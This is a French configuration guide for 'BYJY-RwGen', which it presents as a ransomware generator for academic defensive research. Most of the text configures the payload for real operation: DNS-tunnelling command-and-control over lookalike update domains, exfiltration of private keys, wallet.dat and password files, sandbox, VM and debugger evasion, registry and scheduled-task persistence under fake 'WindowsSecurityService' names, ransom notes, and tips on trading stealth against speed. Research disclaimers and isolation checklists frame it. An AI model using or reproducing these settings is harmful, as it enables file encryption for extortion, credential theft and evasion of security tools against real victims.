# BYJY-RwGen Configuration Guide Complet

## 🔬 Outil de Recherche Académique - Analyse Défensive Uniquement

**⚠️ AVERTISSEMENT IMPORTANT ⚠️**
Cet outil génère du ransomware fonctionnel à des fins de recherche académique uniquement.
Utilisation autorisée uniquement dans des environnements isolés pour le développement de défenses.

---

## 1. Configuration de Build (`build_config.json`)

### Structure Complète
```json
{
  "source_dir": "src",                    // Répertoire source
  "output_dir": "dist",                   // Répertoire de sortie
  "main_executable": "payload.exe",       // Nom de l'exécutable
  "target_architecture": "x64",           // Architecture cible
  
  "compiler_flags": [                     // Flags de compilation
    "/O2",      // Optimisation niveau 2
    "/GL",      // Optimisation globale
    "/MT",      // Runtime statique
    "/DNDEBUG"  // Mode release
  ],
  
  "linker_flags": [                       // Flags de liaison
    "/SUBSYSTEM:WINDOWS",                 // Subsystem Windows
    "/ENTRY:mainCRTStartup",             // Point d'entrée
    "/LTCG"                              // Link Time Code Generation
  ],
  
  "obfuscation_level": "high",            // Niveau d'obfuscation
  "enable_anti_analysis": true,           // Anti-analyse activée
  "pack_executable": true,                // Empaquetage activé
  
  "encryption": {
    "algorithm": "xchacha20poly1305",     // Algorithme de chiffrement
    "key_derivation": "argon2id",         // Dérivation de clé
    "iterations": 10,                     // Itérations KDF
    "memory": 65536,                      // Mémoire KDF (KB)
    "parallelism": 4                      // Threads parallèles KDF
  },
  
  "target_extensions": [...],             // Extensions à chiffrer
  "excluded_paths": [...]                 // Chemins exclus
}
```

### Détails des Paramètres

#### Paramètres de Base
- **`source_dir`** : Répertoire contenant le code source C++
- **`output_dir`** : Où placer l'exécutable compilé
- **`main_executable`** : Nom du fichier exécutable final
- **`target_architecture`** : 
  - `"x86"` : 32-bit (compatibilité maximale)
  - `"x64"` : 64-bit (performance optimale)

#### Compilation Avancée
- **`compiler_flags`** : 
  - `/O2` : Optimisation vitesse/taille équilibrée
  - `/GL` : Optimisation inter-modules
  - `/MT` : Runtime C statique (indépendant)
  - `/DNDEBUG` : Supprime les assertions debug

- **`linker_flags`** :
  - `/SUBSYSTEM:WINDOWS` : Application Windows GUI
  - `/SUBSYSTEM:CONSOLE` : Application console
  - `/LTCG` : Link Time Code Generation

#### Obfuscation et Protection
- **`obfuscation_level`** :
  - `"low"` : Obfuscation de chaînes basique
  - `"medium"` : + Obfuscation de flux de contrôle
  - `"high"` : + Passes LLVM, polymorphisme

- **`enable_anti_analysis`** :
  - Détection de sandbox/VM
  - Détection de debugger
  - Vérifications d'intégrité

#### Configuration de Chiffrement
- **`algorithm`** : `xchacha20poly1305` (recommandé, sécurisé)
- **`key_derivation`** : `argon2id` (résistant aux attaques)
- **`iterations`** : Nombre d'itérations (10 = rapide, 100+ = sécurisé)

---

## 2. Configuration C&C (`c2_config.json`)

### Structure Complète
```json
{
  "c2_domain": "update-security-check.com",
  "backup_domains": [
    "system-maintenance-srv.org",
    "critical-update-service.net"
  ],
  
  "communication": {
    "method": "dns_tunneling",            // Méthode de communication
    "chunk_size": 30,                     // Taille des chunks (bytes)
    "poll_interval": 300,                 // Intervalle de polling (s)
    "max_retries": 5,                     // Tentatives max
    "timeout": 10                         // Timeout réseau (s)
  },
  
  "encryption_key": "CHANGE_THIS_KEY",    // Clé de chiffrement C&C
  
  "exfiltration": {
    "enabled": true,                      // Exfiltration activée
    "max_file_size": 10485760,           // Taille max par fichier
    "compression": true,                  // Compression activée
    "targets": [                         // Types de fichiers à exfiltrer
      "*.key", "*.p12", "*.pfx",
      "wallet.dat", "*password*"
    ]
  },
  
  "ransom_note": {
    "filename": "RECOVERY_INSTRUCTIONS.txt",
    "contact_email": "research@university.edu",
    "payment_amount": "0.05",             // Bitcoin (pour recherche)
    "deadline_hours": 72
  }
}
```

### Détails C&C

#### Domaines de Commande
- **`c2_domain`** : Domaine principal pour DNS tunneling
- **`backup_domains`** : Domaines de secours (important pour la résilience)

#### Communication DNS Tunneling
- **`method`** : Toujours `"dns_tunneling"` (le plus furtif)
- **`chunk_size`** : 
  - 30 bytes : Optimal pour DNS (limite 63 bytes/label)
  - Plus petit = plus furtif, plus grand = plus rapide
- **`poll_interval`** : 
  - 300s (5min) : Équilibre détection/réactivité
  - 60s : Plus réactif, plus détectable
  - 1800s (30min) : Plus furtif, moins réactif

#### Sécurité Communication
- **`encryption_key`** : Clé 64 caractères hexadécimaux
  - Générer : `openssl rand -hex 32`
  - **CRITIQUE** : Changer pour chaque campagne

#### Exfiltration de Données
- **`enabled`** : Active l'exfiltration automatique
- **`max_file_size`** : Limite par fichier (10MB = équilibré)
- **`targets`** : Patterns de fichiers sensibles

---

## 3. Configuration Payload (`payload_config.json`)

### Structure Complète
```json
{
  "execution": {
    "delay_start": 30,                    // Délai avant exécution (s)
    "check_sandbox": true,                // Vérification sandbox
    "check_debugger": true,               // Vérification debugger
    "check_vm": true,                     // Vérification VM
    "minimum_ram_gb": 4,                  // RAM minimum (GB)
    "minimum_disk_gb": 100,               // Disque minimum (GB)
    "minimum_cpu_cores": 2                // CPU cores minimum
  },
  
  "encryption": {
    "threads": 8,                         // Threads de chiffrement
    "chunk_size": 1048576,               // Taille chunk (1MB)
    "progress_callback": true,            // Callbacks de progression
    "verify_integrity": true,             // Vérification intégrité
    "secure_delete_passes": 7             // Passes d'effacement sécurisé
  },
  
  "persistence": {
    "methods": [                         // Méthodes de persistance
      "registry",                        // Registre Windows
      "scheduled_task",                  // Tâche planifiée
      "startup_folder"                   // Dossier démarrage
    ],
    "service_name": "WindowsSecurityService",
    "task_name": "SystemSecurityUpdate"
  }
}
```

### Détails Payload

#### Contrôles d'Exécution
- **`delay_start`** : Évite la détection heuristique immédiate
- **`minimum_ram_gb`** : 4GB+ (évite les sandboxes low-resource)
- **`minimum_cpu_cores`** : 2+ (évite les VM mono-core)

#### Performance de Chiffrement
- **`threads`** : 
  - 1-4 : Plus discret, CPU usage faible
  - 8+ : Plus rapide, plus visible
- **`chunk_size`** :
  - 64KB : Faible usage mémoire
  - 1MB : Équilibré performance/mémoire
  - 10MB+ : Très rapide, usage mémoire élevé

#### Effacement Sécurisé
- **`secure_delete_passes`** :
  - 1 : Rapide, récupération possible
  - 3 : Standard DoD
  - 7 : Méthode Gutmann (recommandé)
  - 35 : Gutmann complet (très lent)

---

## 4. Configuration Linux (`linux_build.conf`)

### Variables Principales
```bash
# Architecture cible
TARGET_ARCH="x86_64"        # x86_64, i686, arm, aarch64

# Niveau d'obfuscation
OBFUSCATION_LEVEL="high"    # low, medium, high

# Flags de compilation
CFLAGS="-O3 -fno-stack-protector -static"
LDFLAGS="-s -Wl,--gc-sections"

# Extensions cibles
TARGET_EXTENSIONS=(".txt" ".pdf" ".jpg")

# Chemins exclus
EXCLUDED_PATHS=("/bin" "/usr/bin" "/sbin")
```

---

## 5. Guide d'Utilisation Complète

### 5.1. Installation et Préparation

```bash
# 1. Cloner le projet (déjà fait)
cd /app

# 2. Installer les dépendances
pip install -r requirements.txt

# 3. Appliquer les corrections
python3 fix_imports.py

# 4. Configurer l'outil
python3 master_builder.py --configure
```

### 5.2. Configuration Personnalisée

#### Étape 1 : Configuration de Build
Éditez `/app/build_config.json` :
```json
{
  "target_architecture": "x64",          // Votre architecture
  "obfuscation_level": "high",           // Niveau souhaité
  "target_extensions": [".txt", ".doc"]  // Extensions à tester
}
```

#### Étape 2 : Configuration C&C
Éditez `/app/c2_config.json` :
```json
{
  "c2_domain": "test-research.local",     // Domaine de test local
  "encryption_key": "VOTRE_CLE_64_CHARS", // Générer nouvelle clé
  "ransom_note": {
    "contact_email": "recherche@votre-uni.edu"
  }
}
```

#### Étape 3 : Configuration Payload
Éditez `/app/payload_config.json` :
```json
{
  "execution": {
    "delay_start": 5,                     // Court pour tests
    "minimum_ram_gb": 1                   // Faible pour VM test
  },
  "encryption": {
    "threads": 2,                         // Limité pour tests
    "secure_delete_passes": 1             // Rapide pour recherche
  }
}
```

### 5.3. Génération de Clés Sécurisées

```bash
# Clé C&C (256-bit)
openssl rand -hex 32

# Clé de chiffrement payload
openssl rand -base64 32

# Clé de session
openssl rand -hex 16
```

### 5.4. Build et Test

```bash
# Build Windows (si sur Windows/Wine)
python3 master_builder.py --build windows

# Build Linux
python3 master_builder.py --build linux

# Validation environnement
python3 master_builder.py --validate
```

### 5.5. Environnement de Test Sécurisé

#### Configuration VM de Test
```yaml
# Spécifications VM recommandées
RAM: 4GB minimum
CPU: 2 cores minimum
Disk: 100GB
Network: Isolé (pas d'Internet)
OS: Windows 10/11 ou Ubuntu 22.04

# Snapshots
- Snapshot initial (clean)
- Snapshot pré-infection
- Snapshot post-analyse
```

#### Monitoring de Sécurité
```bash
# Surveillance réseau
tcpdump -i any -w capture.pcap

# Surveillance système
strace -p PID -o syscalls.log    # Linux
procmon.exe                      # Windows

# Surveillance fichiers
auditd                           # Linux
sysmon                          # Windows
```

---

## 6. Paramètres Avancés de Recherche

### 6.1. Modes de Fonctionnement

#### Mode Recherche Standard
```json
{
  "research_mode": true,
  "verbose_logging": true,
  "simulate_only": false,
  "target_extensions": [".txt", ".test"],
  "excluded_paths": ["C:\\Windows", "C:\\Program Files"]
}
```

#### Mode Simulation (Sans Chiffrement Réel)
```json
{
  "research_mode": true,
  "simulate_only": true,        // Simule sans chiffrer
  "dry_run": true,             // Affiche actions sans exécuter
  "log_level": "DEBUG"
}
```

### 6.2. Configurations de Test Spécialisées

#### Test Anti-Détection
```json
{
  "execution": {
    "check_sandbox": true,
    "sandbox_checks": [
      "memory", "cpu", "processes", "registry", 
      "files", "network", "timing", "interaction"
    ]
  }
}
```

#### Test Performance
```json
{
  "encryption": {
    "benchmark_mode": true,
    "measure_timing": true,
    "profile_memory": true,
    "threads": [1, 2, 4, 8]      // Test multiple configurations
  }
}
```

#### Test Communication C&C
```json
{
  "communication": {
    "test_mode": true,
    "local_server": true,
    "capture_traffic": true,
    "dns_servers": ["127.0.0.1"]  // Serveur DNS local
  }
}
```

---

## 7. Sécurité et Considérations Légales

### 7.1. Mesures de Sécurité Obligatoires

#### Isolation Réseau
- ✅ VM complètement isolée
- ✅ Pas d'accès Internet depuis la VM test
- ✅ Firewall bloquant tout trafic sortant
- ✅ Monitoring de tout le trafic réseau

#### Contrôle d'Accès
- ✅ Accès limité au personnel autorisé
- ✅ Authentification forte
- ✅ Logging de tous les accès
- ✅ Révision régulière des permissions

#### Gestion des Données
- ✅ Chiffrement des données de recherche
- ✅ Sauvegarde sécurisée des configurations
- ✅ Destruction sécurisée après recherche
- ✅ Documentation de toute utilisation

### 7.2. Responsabilités Légales

#### Autorisation Institutionnelle
- 📋 Approbation du comité d'éthique
- 📋 Supervision académique
- 📋 Documentation du projet de recherche
- 📋 Objectifs de recherche défensive clairs

#### Conformité Réglementaire
- ⚖️ Respect des lois locales sur la cybersécurité
- ⚖️ Conformité RGPD/protection des données
- ⚖️ Respect des politiques institutionnelles
- ⚖️ Divulgation responsable des vulnérabilités

---

## 8. Troubleshooting Configuration

### 8.1. Erreurs Communes

#### Problème : Build échoue
```bash
# Solution 1 : Vérifier dépendances
python3 master_builder.py --validate

# Solution 2 : Nettoyer et rebuild
rm -rf dist/ && python3 master_builder.py --build
```

#### Problème : Communication C&C échoue
```json
// Vérifier configuration DNS
{
  "dns_servers": ["8.8.8.8", "1.1.1.1"],
  "timeout": 30,                    // Augmenter timeout
  "max_retries": 10                 // Plus de tentatives
}
```

#### Problème : Anti-analyse trop strict
```json
{
  "execution": {
    "minimum_ram_gb": 1,            // Réduire exigences
    "minimum_cpu_cores": 1,         // Accepter mono-core
    "check_vm": false               // Désactiver détection VM
  }
}
```

### 8.2. Optimisation Performance

#### Pour Tests Rapides
```json
{
  "encryption": {
    "threads": 1,
    "chunk_size": 65536,            // 64KB
    "secure_delete_passes": 1
  },
  "communication": {
    "poll_interval": 10,            // 10 secondes
    "chunk_size": 50
  }
}
```

#### Pour Tests Approfondis
```json
{
  "encryption": {
    "threads": 8,
    "chunk_size": 1048576,          // 1MB
    "secure_delete_passes": 7
  },
  "communication": {
    "poll_interval": 300,           // 5 minutes
    "chunk_size": 30
  }
}
```

---

## 9. Conclusions et Recommandations

### ✅ Configuration Finale Recommandée pour la Recherche

1. **Mode Test Sécurisé** : Environnement isolé obligatoire
2. **Supervision Académique** : Encadrement institutionnel requis
3. **Objectifs Défensifs** : Usage exclusivement défensif
4. **Documentation** : Traçabilité complète des activités
5. **Destruction Sécurisée** : Nettoyage après recherche

### 🔬 Applications de Recherche Légitimes

- Développement de solutions EDR/XDR
- Test de capacité de détection des antivirus
- Recherche sur les communications C&C
- Étude des techniques d'évasion
- Formation en réponse à incident

**L'outil BYJY-RwGen est maintenant configuré à 100% pour la recherche académique défensive.**